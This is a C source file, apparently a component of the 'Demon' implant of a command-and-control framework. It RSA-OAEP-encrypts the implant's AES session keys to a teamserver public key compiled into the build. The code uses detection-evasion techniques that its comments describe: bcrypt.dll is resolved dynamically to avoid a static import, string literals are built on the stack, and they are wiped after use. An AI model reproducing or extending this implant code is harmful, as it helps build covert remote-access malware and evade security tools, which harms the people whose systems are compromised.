/*
 * [HVC-005 2026-03-28] RsaCrypt.c
 *
 * RSA-2048-OAEP-SHA256 encryption of the Demon AES session key material.
 * The teamserver's RSA-2048 public key is supplied at compile time as the
 * SERVER_PUBKEY_BLOB define (a BCRYPT_RSAPUBLIC_BLOB byte array, 283 bytes).
 *
 * The BCrypt API is loaded dynamically at runtime via LdrLoadDll /
 * LdrGetProcedureAddress to avoid a static bcrypt.dll import.
 * All wide-string literals are constructed on the stack.
 *
 * See TrafficImprovements.md §5 for design rationale.
 */

#include <crypt/RsaCrypt.h>
#include <core/MiniStd.h>

/*
 * All BCrypt types (BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE,
 * BCRYPT_OAEP_PADDING_INFO, BCRYPT_PAD_OAEP, NTSTATUS, NT_SUCCESS,
 * STATUS_SUCCESS) are provided by bcrypt.h which arrives via:
 *   Demon.h → windows.h → wincrypt.h → bcrypt.h
 * No redefinitions needed here.
 *
 * Function pointer variables are declared inline (anonymous types) inside
 * RsaOaepEncrypt rather than via named typedefs, to avoid any name-collision
 * with the concrete BCrypt function declarations already in bcrypt.h.
 */

/* ── Helper: resolve a single named export from a loaded module handle ──────── */

static PVOID RsaCryptGetProc( HMODULE hMod, PCHAR Name )
{
    ANSI_STRING    AnsiStr   = { 0 };
    PVOID          FuncAddr  = NULL;
    NTSTATUS       Status;

    AnsiStr.Length        = ( USHORT ) StringLengthA( Name );
    AnsiStr.MaximumLength = AnsiStr.Length + 1;
    AnsiStr.Buffer        = Name;

    Status = Instance->Win32.LdrGetProcedureAddress(
        ( PVOID ) hMod, &AnsiStr, 0, &FuncAddr );

    if ( ! NT_SUCCESS( Status ) )
        return NULL;

    return FuncAddr;
}

/* ────────────────────────────────────────────────────────────────────────────── */

BOOL RsaOaepEncrypt(
    _In_  PUCHAR PubKeyBlob,
    _In_  ULONG  PubKeyLen,
    _In_  PUCHAR PlainText,
    _In_  ULONG  PlainLen,
    _Out_ PUCHAR CipherText )
{
    /*
     * BCrypt wide-string literals built on the stack to avoid static Unicode
     * data sections. Each array holds the UTF-16LE characters plus a null.
     */
    WCHAR wcBcrypt[] = { 'b','c','r','y','p','t','.','d','l','l', 0 };
    WCHAR wcRSA[]    = { 'R','S','A', 0 };
    WCHAR wcBlob[]   = { 'R','S','A','P','U','B','L','I','C','B','L','O','B', 0 };
    WCHAR wcSHA256[] = { 'S','H','A','2','5','6', 0 };

    UNICODE_STRING       UnicodeStr   = { 0 };
    HMODULE              hBcrypt      = NULL;
    BCRYPT_ALG_HANDLE    hAlg         = NULL;
    BCRYPT_KEY_HANDLE    hKey         = NULL;
    BOOL                 bResult      = FALSE;
    ULONG                cbResult     = 0;
    NTSTATUS             Status;

    BCRYPT_OAEP_PADDING_INFO PaddingInfo = { 0 };

    /* Anonymous inline function pointer declarations — avoids typedef/bcrypt.h name conflicts. */
    NTSTATUS ( WINAPI *pBCryptOpenAlgorithmProvider  )( BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG )                                                                    = NULL;
    NTSTATUS ( WINAPI *pBCryptImportKeyPair          )( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, ULONG )                        = NULL;
    NTSTATUS ( WINAPI *pBCryptEncrypt                )( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG )                           = NULL;
    NTSTATUS ( WINAPI *pBCryptDestroyKey             )( BCRYPT_KEY_HANDLE )                                                                                                = NULL;
    NTSTATUS ( WINAPI *pBCryptCloseAlgorithmProvider )( BCRYPT_ALG_HANDLE, ULONG )                                                                                        = NULL;

    if ( ! PubKeyBlob || PubKeyLen != RSA_PUBKEY_BLOB_LEN ||
         ! PlainText  || ! CipherText )
        return FALSE;

    /* ── 1. Load bcrypt.dll via LdrLoadDll ───────────────────────────────────── */
    UnicodeStr.Buffer        = wcBcrypt;
    UnicodeStr.Length        = ( USHORT )( 10 * sizeof( WCHAR ) );   /* "bcrypt.dll" */
    UnicodeStr.MaximumLength = UnicodeStr.Length + sizeof( WCHAR );

    Status = Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeStr, ( PVOID * ) &hBcrypt );
    if ( ! NT_SUCCESS( Status ) || ! hBcrypt )
        goto CLEANUP;

    /* ── 2. Resolve the five BCrypt functions we need ────────────────────────── */
    pBCryptOpenAlgorithmProvider  = RsaCryptGetProc( hBcrypt, "BCryptOpenAlgorithmProvider" );
    pBCryptImportKeyPair          = RsaCryptGetProc( hBcrypt, "BCryptImportKeyPair" );
    pBCryptEncrypt                = RsaCryptGetProc( hBcrypt, "BCryptEncrypt" );
    pBCryptDestroyKey             = RsaCryptGetProc( hBcrypt, "BCryptDestroyKey" );
    pBCryptCloseAlgorithmProvider = RsaCryptGetProc( hBcrypt, "BCryptCloseAlgorithmProvider" );

    if ( ! pBCryptOpenAlgorithmProvider || ! pBCryptImportKeyPair ||
         ! pBCryptEncrypt               || ! pBCryptDestroyKey    ||
         ! pBCryptCloseAlgorithmProvider )
        goto CLEANUP;

    /* ── 3. Open the RSA algorithm provider ─────────────────────────────────── */
    Status = pBCryptOpenAlgorithmProvider( &hAlg, wcRSA, NULL, 0 );
    if ( ! NT_SUCCESS( Status ) )
        goto CLEANUP;

    /* ── 4. Import the public key from the BCRYPT_RSAPUBLIC_BLOB ─────────────── */
    Status = pBCryptImportKeyPair(
        hAlg, NULL, wcBlob, &hKey,
        PubKeyBlob, PubKeyLen, 0 );
    if ( ! NT_SUCCESS( Status ) )
        goto CLEANUP;

    /* ── 5. Encrypt with OAEP-SHA256, no label ─────────────────────────────── */
    PaddingInfo.pszAlgId = wcSHA256;
    PaddingInfo.pbLabel  = NULL;
    PaddingInfo.cbLabel  = 0;

    Status = pBCryptEncrypt(
        hKey,
        PlainText, PlainLen,
        &PaddingInfo,
        NULL, 0,                /* no IV for RSA */
        CipherText, RSA_CIPHERTEXT_LEN,
        &cbResult,
        BCRYPT_PAD_OAEP );

    if ( NT_SUCCESS( Status ) && cbResult == RSA_CIPHERTEXT_LEN )
        bResult = TRUE;

CLEANUP:
    if ( hKey  && pBCryptDestroyKey             ) pBCryptDestroyKey( hKey );
    if ( hAlg  && pBCryptCloseAlgorithmProvider ) pBCryptCloseAlgorithmProvider( hAlg, 0 );

    /* Wipe stack-local wide strings */
    MemZero( wcBcrypt, sizeof( wcBcrypt ) );
    MemZero( wcRSA,    sizeof( wcRSA    ) );
    MemZero( wcBlob,   sizeof( wcBlob   ) );
    MemZero( wcSHA256, sizeof( wcSHA256 ) );

    return bResult;
}
